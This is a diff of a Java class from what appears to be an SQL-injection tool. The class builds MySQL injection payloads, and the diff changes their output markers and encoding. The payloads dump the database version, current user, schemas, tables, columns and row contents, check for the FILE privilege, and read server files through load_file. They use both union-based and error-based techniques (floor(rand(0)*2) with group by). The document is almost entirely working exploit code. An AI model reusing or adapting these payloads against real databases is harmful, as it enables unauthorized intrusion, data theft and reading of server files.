@@ -16,7 +16,7 @@ public class MySQLStrategy implements ISQLStrategy {
     public String getSchemaInfos() {
         return 
             "concat(" +
-                "hex(" +
+                "" +
                     "concat_ws(" +
                         "0x7b257d," +
                         "version()," +
@@ -24,9 +24,9 @@ public class MySQLStrategy implements ISQLStrategy {
                         "user()," +
                         "CURRENT_USER" +
                     ")" +
-                ")" +
+                "" +
                 "," +
-                "0x69" +
+                "0x01030307" +
             ")";
     }
 
@@ -36,19 +36,19 @@ public class MySQLStrategy implements ISQLStrategy {
             "select+" +
                 "concat(" +
                     "group_concat(" +
-                        "0x6868," +
+                        "0x04," +
                         "r," +
-                        "0x6a6a," +
-                        "hex(cast(q+as+char))," +
-                        "0x6868" +
+                        "0x05," +
+                        "cast(q+as+char)," +
+                        "0x04" +
                         "+order+by+r+" +
-                        "separator+0x6767" +
+                        "separator+0x06" +
                     ")," +
-                    "0x69" +
+                    "0x01030307" +
                 ")" +
             "from(" +
                 "select+" +
-                    "hex(cast(TABLE_SCHEMA+as+char))r," +
+                    "cast(TABLE_SCHEMA+as+char)r," +
                     "count(TABLE_NAME)q+" +
                 "from+" +
                     "INFORMATION_SCHEMA.tables+" +
@@ -62,15 +62,15 @@ public class MySQLStrategy implements ISQLStrategy {
             "select+" +
                 "concat(" +
                     "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(r+as+char))," +
-                        "0x6a6a," +
-                        "hex(cast(ifnull(q,0x30)+as+char))," +
-                        "0x6868+" +
+                        "0x04," +
+                        "cast(r+as+char)," +
+                        "0x05," +
+                        "cast(ifnull(q,0x30)+as+char)," +
+                        "0x04+" +
                         "order+by+r+" +
-                        "separator+0x6767" +
+                        "separator+0x06" +
                     ")," +
-                    "0x69" +
+                    "0x01030307" +
                 ")" +
             "from(" +
                 "select+" +
@@ -90,15 +90,15 @@ public class MySQLStrategy implements ISQLStrategy {
             "select+" +
                 "concat(" +
                     "group_concat(" +
-                        "0x6868," +
-                        "hex(cast(n+as+char))," +
-                        "0x6a6a," +
-                        "0x3331," +
-                        "0x6868+" +
+                        "0x04," +
+                        "cast(n+as+char)," +
+                        "0x05," +
+                        "0," +
+                        "0x04+" +
                         "order+by+n+" +
-                        "separator+0x6767" +
+                        "separator+0x06" +
                     ")," +
-                    "0x69" +
+                    "0x01030307" +
                 ")" +
             "from(" +
                 "select+" +
@@ -118,28 +118,24 @@ public class MySQLStrategy implements ISQLStrategy {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
         // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
-        //        formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" );
-        
-        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
         formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`");
         
-        //        formatListColumn = "trim(`" + formatListColumn + "`)" ;
         formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))";
         
         return 
             "select+concat(" +
                 "group_concat(" +
-                    "0x6868," +
+                    "0x04," +
                     "r," +
-                    "0x6a6a," +
-                    "hex(cast(q+as+char))," +
-                    "0x6868" +
-                    "+order+by+r+separator+0x6767" +
+                    "0x05," +
+                    "cast(q+as+char)," +
+                    "0x04" +
+                    "+order+by+r+separator+0x06" +
                 ")," +
-                "0x69" +
+                "0x01030307" +
             ")from(" +
                 "select+" +
-                    "hex(cast(concat(" + formatListColumn + ")as+char))r," +
+                    "cast(concat(" + formatListColumn + ")as+char)r," +
                     "count(*)q+" +
                 "from+" +
                     "`" + database + "`.`" + table + "`+" +
@@ -150,24 +146,36 @@ public class MySQLStrategy implements ISQLStrategy {
     @Override
     public String getPrivilege() {
         return 
-            "concat(" +
-                "(" +
-                    "select+" +
-                        "hex(" +
+            /**
+             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
+             * => forcage en charactère
+             */
+            "cast(" +
+                "concat(" +
+                    "(" +
+                        "select+" +
                             "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-                        ")" +
-                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-                    "where+" +
-                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-                        "and+PRIVILEGE_TYPE=0x46494c45" +
-                ")," +
-                "0x69" +
-            ")";
+                        "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
+                        "where+" +
+                            "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
+                            "and+PRIVILEGE_TYPE=0x46494c45" +
+                    ")" +
+                    "," +
+                    "0x01030307" +
+                ")" +
+            "+as+char)";
     }
 
     @Override
     public String readTextFile(String filePath) {
-        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
+        return 
+            /**
+             * error base mysql remplace 0x01030307 en \x01\x03\x03\x07
+             * => forcage en charactère
+             */
+             "cast(" +
+                 "concat(load_file(0x" + ToolsString.strhex(filePath) + "),0x01030307)" +
+             "as+char)";
     }
 
     @Override
@@ -237,7 +245,7 @@ public class MySQLStrategy implements ISQLStrategy {
                     "mid(" +
                         "(" + sqlQuery + ")," +
                         startPosition + "," +
-                        "65536" +
+                        MediatorModel.model().performanceLength +
                     ")" +
                 ")" +
             ")";
@@ -271,13 +279,28 @@ public class MySQLStrategy implements ISQLStrategy {
                         "count(*)," +
                         "concat(" +
                             "0x53514c69," +
-                            "mid(" +
-                                "(" + sqlQuery + ")," +
-                                startPosition + "," +
-                                "64" +
-                            ")," +
-                        "floor(rand(0)*2)" +
-                    ")" +
+                            "replace(" +
+                                "mid(" +
+                                    "replace(" +
+                                        "(" + sqlQuery + ")" +
+                                    /**
+                                     * message error base remplace le \r en \r\n => pb de comptage
+                                     * Fix: remplacement forcé 0x0D => 0x0000
+                                     */
+                                    ",0x0D,0x0000)," +
+                                    startPosition + "," +
+                                    /**
+                                     * errorbase renvoit 64 caractères: 'SQLi' en consomme 4
+                                     * inutile de renvoyer plus de 64
+                                     */
+                                    "60" +
+                                ")" +
+                            /**
+                             * rétablissement 0x0000 => 0x0D
+                             */
+                            ",0x0000,0x0D)," +
+                            "floor(rand(0)*2)" +
+                        ")" +
                     "from+information_schema.tables+" +
                     "group+by+2" +
                 ")a" +
@@ -297,7 +320,10 @@ public class MySQLStrategy implements ISQLStrategy {
                     "mid(" +
                         "(" + sqlQuery + ")," +
                         startPosition + "," +
-                        "65536" +
+                        /**
+                         * Minus 'SQLi' should apply
+                         */
+                        MediatorModel.model().performanceLength +
                     ")" +
                 ")" +
         ")";
@@ -324,7 +350,7 @@ public class MySQLStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select+concat(0x53514c69,$1,repeat(0x23,1024),0x694c5153))"
+                "(select+concat(0x53514c69,$1,repeat(0x23,65536),0x010303074c5153))"
             );
     }
 
